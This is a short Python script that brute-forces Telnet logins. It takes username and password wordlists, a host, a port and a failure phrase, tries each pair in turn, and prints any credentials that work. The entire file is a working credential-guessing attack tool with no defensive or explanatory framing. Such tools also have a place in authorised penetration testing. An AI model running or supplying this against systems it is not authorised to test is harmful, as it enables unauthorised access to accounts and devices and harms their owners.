from telnetlib import Telnet
from time import sleep

def main():
    logins = open(input("Path to file with logins:\n"), "r")
    passwords = open(input("Path to file with passwords:\n"), "r")
    host = input("Host:\n")
    port = input("Port:\n")
    errorLogin = input("Invalid situation phrase (for skipping attempt):\n")
    loginsList = logins.readlines()
    passwordsList = passwords.readlines()
    for user in loginsList:
        if "\n" in user: user = user[:-1]
        f = False
        for password in passwordsList:
            if "\n" in password: password = password[:-1]
            with Telnet(host, int(port)) as tn:
                print("user:", user, "& password:", password)
                tn.read_until(b"Username: ",1)
                tn.write(user.encode('ascii') + b"\n")
                tn.read_until(b"Password: ")
                tn.write(password.encode('ascii') + b"\n")
                res = tn.read_until(b'>', 5)
                if errorLogin.encode('ascii') not in res:
                    print("Credentials detected!\n\tUserneme -", "\""+user+"\"", "\n\tPassword -", "\""+password+"\"")
                    f = True
                    break
                tn.close()
                sleep(3)
        if f==True: break

main()